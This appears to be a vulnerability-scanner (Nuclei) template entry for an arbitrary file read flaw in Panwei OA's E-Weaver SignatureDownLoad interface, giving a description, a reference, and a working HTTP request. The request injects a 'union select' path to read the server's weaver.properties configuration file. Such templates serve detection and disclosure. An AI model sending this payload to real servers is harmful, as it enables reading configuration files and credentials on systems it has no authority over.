# Nuclei Template: OA E-Weaver SignatureDownLoad - Arbitrary File Read
**Template ID:** weaver-signaturedownload-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`weaver-signaturedownload-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the E-Weaver SignatureDownLoad interface of Panwei OA. An attacker can read any file on the server through the vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
